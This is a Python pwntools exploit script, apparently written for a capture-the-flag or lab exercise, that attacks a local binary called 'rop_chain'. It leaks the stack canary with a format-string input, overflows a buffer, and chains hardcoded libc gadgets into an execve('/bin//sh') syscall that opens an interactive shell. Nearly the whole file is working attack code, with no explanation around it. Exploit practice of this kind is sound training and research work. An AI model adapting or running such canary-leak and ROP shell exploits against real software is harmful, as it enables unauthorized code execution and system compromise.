import os

import pwn

script_dir = os.path.dirname(os.path.realpath(__file__))
elf_path = os.path.join(script_dir, "./rop_chain")
libc_path = os.path.join(script_dir, "./../.lib/libc.so.6")


def exploit(io, elf, libc):
    io.sendline(b"%11$lx")
    stack_canary = int(io.recvline(), 16)
    print(f"stack_canary: {hex(stack_canary)}")

    libc_base_addr = 0x15555535C000

    data = libc_base_addr + 0x1BE1A0
    pop_rdx = libc_base_addr + 0xCB1CD
    pop_rax = libc_base_addr + 0x3EE88
    pop_rdi = libc_base_addr + 0x26796
    pop_rsi = libc_base_addr + 0x2890F
    mov_rdx_ptr_rax = libc_base_addr + 0x34B5C
    xor_rax_rax = libc_base_addr + 0x9D9C5
    syscall = libc_base_addr + 0x2552B

    return_address_ofs = 56

    payload = b"A" * (return_address_ofs - 16)
    payload += pwn.p64(stack_canary)
    payload += pwn.p64(0xDEADBEEF)

    payload += pwn.p64(pop_rdx)  # pop rdx ; ret
    payload += pwn.p64(data)  # @ .data
    payload += pwn.p64(pop_rax)  # pop rax ; ret
    payload += b"/bin//sh"
    payload += pwn.p64(mov_rdx_ptr_rax)  # mov qword ptr [rdx], rax ; ret
    payload += pwn.p64(pop_rdx)  # pop rdx ; ret
    payload += pwn.p64(data + 8)  # @ .data + 8
    payload += pwn.p64(xor_rax_rax)  # xor rax, rax ; ret
    payload += pwn.p64(mov_rdx_ptr_rax)  # mov qword ptr [rdx], rax ; ret
    payload += pwn.p64(pop_rdi)  # pop rdi ; ret
    payload += pwn.p64(data)  # @ .data
    payload += pwn.p64(pop_rsi)  # pop rsi ; ret
    payload += pwn.p64(data + 8)  # @ .data + 8
    payload += pwn.p64(pop_rax)  # pop rax ; ret
    payload += pwn.p64(0x3B)
    payload += pwn.p64(syscall)  # syscall

    io.sendline(payload)


def main():
    elf = pwn.context.binary = pwn.ELF(elf_path)
    if pwn.args.GDB:
        io = pwn.gdb.debug(elf.path)
    else:
        io = pwn.process(elf.path)

    exploit(io, None, None)
    io.interactive()


if __name__ == "__main__":
    main()
